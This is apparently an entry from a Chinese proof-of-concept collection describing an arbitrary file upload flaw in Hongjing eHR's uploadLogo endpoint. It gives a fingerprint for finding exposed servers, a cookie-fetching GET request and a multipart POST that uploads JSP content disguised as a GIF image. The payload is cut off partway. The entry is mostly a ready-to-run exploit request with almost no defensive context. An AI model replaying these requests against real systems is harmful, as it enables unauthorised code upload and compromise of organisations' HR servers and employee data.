# 宏景eHRuploadLogo存在任意文件上传漏洞

- **系统**：宏景　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1`

**请求体 / payload**
```
1.获取Cookie
Host:
2.获取上传路径
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host:
Cookie: JSESSIONID=5E5C59903D3719E0E366729B46EAF77D;
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Length: 522
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="path"
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="lfType"
0
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif
<%= "123456" %>
------WebKitFormBoundaryfjK…（脚本共 1653 字，完整版见原文）
```
- **预期**：200　|　—